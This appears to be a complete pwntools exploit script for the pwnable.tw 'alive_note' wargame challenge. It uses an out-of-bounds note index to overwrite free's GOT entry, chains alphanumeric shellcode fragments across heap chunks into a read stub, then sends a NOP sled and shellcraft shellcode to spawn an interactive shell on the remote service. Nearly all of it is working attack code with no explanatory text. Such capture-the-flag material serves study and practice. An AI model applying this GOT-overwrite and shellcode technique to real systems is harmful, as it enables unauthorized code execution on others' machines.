#!/usr/bin/env python
from pwn import *

context.log_level = 'debug'

local = 0
if local:
	p = process('./alive_note')
else:
	p = remote('chall.pwnable.tw', 10300)

elf = ELF('./alive_note')

def cmd(c):
	p.recvuntil('choice :')
	p.sendline(str(c))

def add(idx, name):
	cmd(1)
	p.recvuntil('Index :')
	p.sendline(str(idx))
	p.recvuntil('Name :')
	p.sendline(name)

def show(idx):
	cmd(2)
	p.recvuntil('Index :')
	p.sendline(str(idx))

def delete(idx):
	cmd(3)
	p.recvuntil('Index :')
	p.sendline(str(idx))

def quit():
	cmd(4)

note = 0x0804A080
offset = (elf.got['free'] - note) / 4
info(offset)
padding = p32(0) + p32(0x11)

#   0:   50                      push   eax
#   1:   59                      pop    ecx
#   2:   6a 7a                   push   0x7a
#   4:   5a                      pop    edx
#   5:   53                      push   ebx
#   6:   75 38                   jne    0x40
#   8:   00 00                   add    BYTE PTR [eax],al
#   a:   00 00                   add    BYTE PTR [eax],al
#   c:   11 00                   adc    DWORD PTR [eax],eax
#   e:   00 00                   add    BYTE PTR [eax],al
#  10:   34 46                   xor    al,0x46
#  12:   30 41 35                xor    BYTE PTR [ecx+0x35],al
#  15:   53                      push   ebx
#  16:   75 38                   jne    0x50
#  18:   00 00                   add    BYTE PTR [eax],al
#  1a:   00 00                   add    BYTE PTR [eax],al
#  1c:   11 00                   adc    DWORD PTR [eax],eax
#  1e:   00 00                   add    BYTE PTR [eax],al
#  20:   66 75 63                data16 jne 0x86
#  23:   6b 50 50 50             imul   edx,DWORD PTR [eax+0x50],0x50
#  27:   50                      push   eax
#  28:   00 00                   add    BYTE PTR [eax],al
#  2a:   00 00                   add    BYTE PTR [eax],al
#  2c:   11 00                   adc    DWORD PTR [eax],eax
#  2e:   00 00                   add    BYTE PTR [eax],al
#  30:   58                      pop    eax
#  31:   34 33                   xor    al,0x33
#  33:   34 30                   xor    al,0x30
#  35:   74 39                   je     0x70
#  37:   50                      push   eax
#  38:   00 00                   add    BYTE PTR [eax],al
#  3a:   00 00                   add    BYTE PTR [eax],al
#  3c:   11 00                   adc    DWORD PTR [eax],eax
#  3e:   00 00                   add    BYTE PTR [eax],al
#  40:   58                      pop    eax
#  41:   48                      dec    eax
#  42:   30 41 46                xor    BYTE PTR [ecx+0x46],al
#  45:   75 36                   jne    0x7d
#  47:   50                      push   eax
#  48:   00 00                   add    BYTE PTR [eax],al
#  4a:   00 00                   add    BYTE PTR [eax],al
#  4c:   11 00                   adc    DWORD PTR [eax],eax
#  4e:   00 00                   add    BYTE PTR [eax],al
#  50:   30 41 36                xor    BYTE PTR [ecx+0x36],al
#  53:   30 41 57                xor    BYTE PTR [ecx+0x57],al
#  56:   75 61                   jne    0xb9
sh = (
	'PYjzZSu8' + padding + 
	'4F0A5Su8' + padding + 
	'fuckPPPP' + padding + 
	'X4340t9P' + padding + 
	'XH0AFu6P' + padding + 
	'0A60AWua'
)
print disasm(sh)
sh = sh.split(padding)

#gdb.attach(p, 'b *0x080488EA\nc')

#sh = 'PYTXuA'
add(offset, sh[0])
for i in range(5):
	add(i, sh[i + 1])

delete(offset)

payload = '\x90' * 0x37 + asm(shellcraft.sh())
#raw_input('@')
p.sendline(payload)

p.interactive()
